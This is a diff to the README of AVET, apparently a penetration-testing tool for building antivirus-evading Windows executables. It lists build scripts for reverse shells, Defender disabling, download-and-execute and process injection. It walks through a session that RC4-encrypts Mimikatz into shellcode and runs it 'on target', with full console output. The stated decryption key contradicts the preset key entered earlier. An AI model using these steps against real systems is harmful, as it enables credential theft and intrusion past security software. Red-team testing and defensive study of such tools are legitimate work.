@@ -67,7 +67,7 @@ sudo docker build -t avet:v0.1 .
 ```
 Usage:
 ```bash
-sudo docker run -it --net=host --env="DISPLAY" --volume="$HOME/.Xauthority:/root/.Xauthority:rw" -v $(pwd):/tools/avet/output avet /bin/bash
+sudo docker run -it --net=host --env="DISPLAY" --volume="$HOME/.Xauthority:/root/.Xauthority:rw" -v $(pwd):/tools/avet/output avet:v0.1 /bin/bash
 ```
 For a better experience it is recommend to alias this.
 ```bash
@@ -89,7 +89,9 @@ You can define default LHOST and LPORT values in the `/build/global_connect_conf
 These modifications are temporary, which means that any changes you made will not persist in the build script on disk.
 The modified version is executed once, and your executable built.
 
-Here's a quick example (python3 || gtfo):
+<details>
+<summary>Here is a quick example (<i>Click to expand</i>):</summary>
+
 ```
 python3 avet.py
 
@@ -117,61 +119,69 @@ Welcome to the avet Assistant!
 7 : build_avetenc_mtrprtrxor_revhttps_win64.sh
 8 : build_calcfromcmd_50xshikata_revhttps_win32.sh
 9 : build_calcfrompowersh_50xshikata_revhttps_win32.sh
-10 : build_cpucores_revhttps_win32.sh
-11 : build_disablewindefpsh_xorfromcmd_revhttps_win64.sh
-12 : build_dkmc_downloadexecshc_revhttps_win32.sh
-13 : build_downloadbitsadmin_mtrprtrxor_revhttps_win64.sh
-14 : build_downloadbitsadmin_revhttps_win32.sh
-15 : build_downloadcertutil_revhttps_win32.sh
-16 : build_downloadcurl_mtrprtrxor_revhttps_win64.sh
-17 : build_downloadiexplorer_revhttps_win32.sh
-18 : build_downloadpsh_revhttps_win32.sh
-19 : build_downloadsocket_mtrprtrxor_revhttps_win64.sh
-20 : build_downloadsocket_revhttps_win32.sh
-21 : build_dynamicfromfile_revhttps_win32.sh
-22 : build_fopen_mtrprtrxor_revhttps_win64.sh
-23 : build_fopen_quiet_revhttps_win32.sh
-24 : build_fopen_revhttps_win32.sh
-25 : build_gethostbyname_revhttps_win32.sh
-26 : build_hasvmkey_revhttps_win32.sh
-27 : build_hasvmmac_revtcp_win32.sh
-28 : build_hollowing_targetfromcmd_doubleenc_doubleev_revhttps_win64.sh
-29 : build_hollowing_targetfromcmd_doubleenc_doubleev_revtcp_win32.sh
-30 : build_injectdll_targetfromcmd_execcalc_downloadpsh_fopen_gethostbyname_win32.sh
-31 : build_injectdll_targetfromcmd_execcalc_downloadpsh_fopen_gethostbyname_win64.sh
-32 : build_injectshc_targetfromcmd_fopen_gethostbyname_xor_revhttps_win64.sh
-33 : build_injectshc_targetfromcmd_fopen_gethostbyname_xor_revtcp_win32.sh
-34 : build_kaspersky_fopen_shellrevtcp_win32.sh
-35 : build_mimikatz_pe2shc_xorfromcmd_win64.sh
-36 : build_rc4enc_mimikatz_win64.sh
-37 : buildsvc_20xshikata_bindtcp_win32.sh
+10 : build_checkdomain_rc4_mimikatz.sh
+11 : build_cpucores_revhttps_win32.sh
+12 : build_disablewindefpsh_xorfromcmd_revhttps_win64.sh
+13 : build_dkmc_downloadexecshc_revhttps_win32.sh
+14 : build_downloadbitsadmin_mtrprtrxor_revhttps_win64.sh
+15 : build_downloadbitsadmin_revhttps_win32.sh
+16 : build_downloadcertutil_revhttps_win32.sh
+17 : build_downloadcurl_mtrprtrxor_revhttps_win64.sh
+18 : build_downloadiexplorer_revhttps_win32.sh
+19 : build_downloadpsh_revhttps_win32.sh
+20 : build_downloadsocket_mtrprtrxor_revhttps_win64.sh
+21 : build_downloadsocket_revhttps_win32.sh
+22 : build_dynamicfromfile_revhttps_win32.sh
+23 : build_fibonacci_rc4_mimikatz.sh
+24 : build_fopen_mtrprtrxor_revhttps_win64.sh
+25 : build_fopen_quiet_revhttps_win32.sh
+26 : build_fopen_revhttps_win32.sh
+27 : build_getchar_rc4_mimikatz.sh
+28 : build_gethostbyname_revhttps_win32.sh
+29 : build_hasvmkey_revhttps_win32.sh
+30 : build_hasvmmac_revtcp_win32.sh
+31 : build_hollowing_targetfromcmd_doubleenc_doubleev_revhttps_win64.sh
+32 : build_hollowing_targetfromcmd_doubleenc_doubleev_revtcp_win32.sh
+33 : build_injectdll_targetfromcmd_execcalc_downloadpsh_fopen_gethostbyname_win32.sh
+34 : build_injectdll_targetfromcmd_execcalc_downloadpsh_fopen_gethostbyname_win64.sh
+35 : build_injectshc_targetfromcmd_fopen_gethostbyname_xor_revhttps_win64.sh
+36 : build_injectshc_targetfromcmd_fopen_gethostbyname_xor_revtcp_win32.sh
+37 : build_kaspersky_fopen_shellrevtcp_win32.sh
+38 : build_mimikatz_pe2shc_xorfromcmd_win64.sh
+39 : build_pause_rc4_mimikatz.sh
+40 : build_rc4_interactive_pwsh_mimikatz_win64.sh
+41 : build_rc4_interactive_with_arithmetic_pwsh_mimikatz_win64.sh
+42 : build_rc4enc_mimikatz_win64.sh
+43 : build_sleep_rc4_mimikatz.sh
+44 : build_sleepbyping_rc4_mimikatz.sh
+45 : build_timedfibonacci_rc4_mimikatz.sh
+46 : buildsvc_20xshikata_bindtcp_win32.sh
+
 Which Script would you like to configure and build?
-Enter the corresponding number -> 5
+Enter the corresponding number -> 43
 
 DESCRIPTION :
-# build the .exe file that loads the payload from a given text file
+# RC4-encrypt the payload with a static, preset key.
+# Here, the mimikatz executable is used as payload, converted into shellcode format by pe_to_shellcode.
+# pe_to_shellcode is written by Hasherezade:
+# https://github.com/hasherezade/pe_to_shellcode
+
+# This script expects the Mimikatz executable to be at input/mimikatz.exe
+# and the pe_to_shellcode executable to reside in a folder parallel to avet: ../pe_to_shellcode/pe2shc.exe
 
 Configure the Build Script
-
-# override connect-back settings here, if necessary
--> LPORT=443
--> LHOST=192.168.56.101
-
-# no command preexec
--> set_command_source no_data
--> set_command_exec no_command
 
 # enable debug output
 -> enable_debug_print
 
+# generate key file with preset key
+-> generate_key preset aabbccdd1122
+
+Do you want to add sandbox evasions? [y/N]
+-> N
+
 Executable will be created Shortly please wait.
 
-Found 1 compatible encoders
-Attempting to encode payload with 1 iterations of x86/shikata_ga_nai
-x86/shikata_ga_nai succeeded with size 692 (iteration=0)
-x86/shikata_ga_nai chosen with final size 692
-Payload size: 692 bytes
-Final size of c file: 2933 bytes
 *** ============================================= ***
 
          .==,_                                          
@@ -197,13 +207,26 @@ Final size of c file: 2933 bytes
 
 *** ============================================= ***
 
+Reading module from: input/mimikatz.exe
+[WARNING] This is a console application! The recommended subsystem is GUI.
+[+] Saved as: input/sc_raw.txt
+Starting RC4 encoder...
+Reading payload from file input/sc_raw.txt, expecting raw format.
+payload size in bytes is 1309884
+Reading key from file input/key_raw.txt, expecting raw format.
+Key length in bytes is 6
+Applying RC4 algorithm
+Writing payload to file input/sc_enc_raw.txt
 
-# Call the generated executable like:
-# $ avetenc_dynamicfromfile_revhttps_win32.exe scenc_raw.txt
+# The decryption key is aabbccddee if it has not been changed.
+# You need to provide the decryption key as 2nd command line argument.
+# Call generated executable on target like:
+# $ rc4enc_mimikatz_win64.exe [your mimikatz arguments, probably 'coffee']  [decryption key]
 
 
 Your executable should be in the output folder!
 ```
+</details>
 
 ## AVET the normal way
 
